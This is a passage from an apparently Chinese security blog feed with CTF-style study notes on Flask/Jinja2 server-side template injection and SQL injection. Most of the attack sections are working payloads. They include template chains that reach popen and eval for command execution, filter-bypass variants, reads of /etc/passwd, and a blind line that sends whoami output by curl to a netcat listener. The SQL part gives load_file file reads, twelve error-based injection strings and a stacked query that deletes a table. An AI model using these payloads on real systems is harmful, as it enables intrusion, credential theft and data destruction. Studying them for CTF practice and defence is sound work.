        <content type="html"><![CDATA[<h3 id="模板注入介绍"><a href="#模板注入介绍" class="headerlink" title="模板注入介绍"></a>模板注入介绍</h3><p><a href="https://xz.aliyun.com/t/3679#toc-10" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">服务端模板注入攻击</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SQL 注入</span></span><br><span class="line">$query = <span class="string">"select * from sometable where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line">mysql_query($query);</span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line"><span class="comment">// 模版注入</span></span><br><span class="line">$temp-&gt;render(<span class="string">"Hello "</span>.$_GET[<span class="string">'username'</span>]);</span><br></pre></td></tr></table></figure><a id="more"></a><blockquote><p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 </p><p> ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。 </p></blockquote><h3 id="模块引擎"><a href="#模块引擎" class="headerlink" title="模块引擎"></a>模块引擎</h3><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p><p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p><p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p><p>让我们用例子来简析模板渲染。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;张三&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p><h3 id="模板注入原理"><a href="#模板注入原理" class="headerlink" title="模板注入原理"></a>模板注入原理</h3><pre><code>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程。</code></pre><p>考虑下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure><p>​    使用 Twig 模版引擎渲染页面，其中模版含有   变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。显然这段代码并没有什么问题，即使你想通过 name  参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击。</p><p>​    如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出。</p><h3 id="模板注入检测"><a href="#模板注入检测" class="headerlink" title="模板注入检测"></a>模板注入检测</h3><p> Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name=20 ，则在服务端拼接的模版内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>Twig 模板引擎在编译模板的过程中会计算 20  中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出</p><h3 id="利用ssti攻击"><a href="#利用ssti攻击" class="headerlink" title="利用ssti攻击"></a>利用ssti攻击</h3><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。我们从这段话出发，假定你已经知道ssti漏洞了，但是完全没学过ssti代码怎么写，接下来你可能会学到一点废话。</p><p>我们在pycharm中运行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__)</span><br></pre></td></tr></table></figure><p>返回了&lt;class ‘str’&gt;，对于一个空字符串他已经打印了str类型，在python中，每个类都有一个<strong>bases</strong>属性，列出其基类。现在我们写代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__)</span><br></pre></td></tr></table></figure><p>打印返回(&lt;class ‘object’&gt;,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用<strong>mro</strong>，<strong>mro</strong>给出了method resolution order，即解析方法调用的顺序。我们实例打印一下mro。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__mro__)</span><br></pre></td></tr></table></figure><p>可以看到返回了(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，<strong>mro</strong>返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,<strong>subclasses</strong>() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__())</span><br></pre></td></tr></table></figure><p>python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class ‘os._wrap_close’&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第118个类，0也对应一个类，所以这里写[118]。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117]&#125;&#125;</span><br></pre></td></tr></table></figure><p>这个时候我们便可以利用.<strong>init</strong>.<strong>globals</strong>来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p> 此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。进下来我们将进一步简单讨论如何进行沙箱逃逸。 </p><h3 id="ssti步骤"><a href="#ssti步骤" class="headerlink" title="ssti步骤"></a>ssti步骤</h3><h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><p>首先通过str、dict、tuple或list获取python的基本类(当然也可以利用一些其他在jinja2中存在的对象，比如request)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8]</span><br></pre></td></tr></table></figure><p>可以借助getitem绕过中括号限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2)</span><br><span class="line">&#123;&#125;.__class__.__bases__.__getitem__(0)</span><br><span class="line">().__class__.__bases__.__getitem__(0)</span><br><span class="line">request.__class__.__mro__.__getitem__(8)</span><br></pre></td></tr></table></figure><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[40]  为file类，所以可以对文件进行操作</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line">写文件：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[40](&apos;/tmp&apos;).write(&apos;test&apos;)</span><br></pre></td></tr></table></figure><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache下直接有os类，可以直接执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;id&apos;).read()</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;id&apos;).read()</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure><h2 id="Jinjia2模板引擎通用的RCE-Payload："><a href="#Jinjia2模板引擎通用的RCE-Payload：" class="headerlink" title="Jinjia2模板引擎通用的RCE Payload："></a>Jinjia2模板引擎通用的RCE Payload：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;&lt;command&gt;&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p> 在<command>添加命令即可 </p><h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p><h3 id="过滤-等括号"><a href="#过滤-等括号" class="headerlink" title="过滤[]等括号"></a>过滤[]等括号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用getitem绕过。如原poc &#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过后&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/etc/passwd&apos;).read()</span><br><span class="line">执行命令：</span><br><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&apos;ls&apos;).read()</span><br></pre></td></tr></table></figure><h3 id="过滤class"><a href="#过滤class" class="headerlink" title="过滤class"></a>过滤class</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用session</span><br><span class="line"></span><br><span class="line">poc &#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118]&#125;&#125;</span><br></pre></td></tr></table></figure><p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request[&apos;__cl&apos;+&apos;ass__&apos;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="timeit姿势"><a href="#timeit姿势" class="headerlink" title="timeit姿势"></a>timeit姿势</h3><p>可以学习一下 2017 swpu-ctf的一道沙盒python题，</p><p>这里不详说了，博大精深，我只意会一二。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)</span><br><span class="line"></span><br><span class="line">import platform</span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先获取chr函数，赋值给chr，后面拼接字符串就好了：</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">借助request对象(推荐)：</span><br><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line">执行命令：</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure><h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线__"></a>过滤双下划线__</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤&#123;&#123;</span><br><span class="line">可以利用&#123;%if%&#125; &#123;% endif %&#125;标记</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;</span><br><span class="line">nc -nlvp 7999</span><br><span class="line">相当于盲命令执行，利用curl将执行结果带出来</span><br><span class="line">如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</span><br><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/test&apos;).read()[0:1]==&apos;p&apos; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h3><p><strong>base64编码绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__getattribute__使用实例访问属性时,调用该方法</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如被过滤掉__class__关键词</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>字符串拼接绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;__c&apos;+&apos;lass__&apos;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[131].__init__.__globals__[&apos;__builtins__&apos;][&apos;ev&apos;+&apos;al&apos;](&apos;__im&apos;+&apos;port__(&quot;o&apos;+&apos;s&quot;).po&apos;+&apos;pen(&quot;cat /this_is_the_fl&apos;+&apos;ag.txt&quot;)&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&apos;sys&apos;].modules[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;po&apos;+&apos;pen&apos;](&apos;cat /this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>python还有一些内置函数，比如url_for和get_flashed_messages </p></blockquote><p><strong>get_flashed_messages</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/17/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><ul><li>对表名为纯数字的表进行操作时，要在前后加上`符号。</li><li>对列名进行更改时，要在后面指定修改后的数据类型  </li><li>盲注时候多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</li></ul></blockquote><a id="more"></a><h1 id="load-file-的使用"><a href="#load-file-的使用" class="headerlink" title="load_file()的使用"></a>load_file()的使用</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 要有file_priv权限</span><br><span class="line"><span class="number">2.</span> 知道文件绝对路径</span><br><span class="line"><span class="number">3.</span> 对web目录有读权限  </span><br><span class="line">注：若过滤了单引号，则可以将函数中的字符进行hex编码</span><br></pre></td></tr></table></figure><h2 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h2><p>读/etc/init.d下的东西，这里有配置文件路径</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/init.d/httpd'</span>)</span><br></pre></td></tr></table></figure><p>得到web安装路径</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/apache/conf/httpd.conf'</span>)</span><br></pre></td></tr></table></figure><p>读取密码文件</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="symbol">'var</span>/www/html/xxx.com/php/conn.inc.php')</span><br></pre></td></tr></table></figure><p>  读取系统中所有的用户和用户的主要信息 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure><p>查看用户的history</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;~/.bash_history&apos;)     （“~/”表示用户目录）</span><br></pre></td></tr></table></figure><h1 id="sql注入12个报错方式"><a href="#sql注入12个报错方式" class="headerlink" title="sql注入12个报错方式"></a>sql注入12个报错方式</h1><p><a href="https://www.bugku.com/forum.php?mod=viewthread&tid=93&extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">sql注入12个报错方式</a></p><blockquote><p>1、通过floor报错,注入语句如下:<br>and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p><p>2、通过ExtractValue报错,注入语句如下:<br>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p>3、通过UpdateXml报错,注入语句如下:<br>and 1=(updatexml(1,concat(0x3a,(select user())),1))</p><p>4、通过NAME_CONST报错,注入语句如下:<br>and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p><p>5、通过join报错,注入语句如下:<br>select * from(select * from mysql.user ajoin mysql.user b)c;</p><p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p><p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p><p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p><p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p><p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p><p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p><p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p></blockquote><h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote><p>在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL </p></blockquote><blockquote><p>​    在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products;当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p></blockquote><h1 id="mysql查询语句-handler"><a href="#mysql查询语句-handler" class="headerlink" 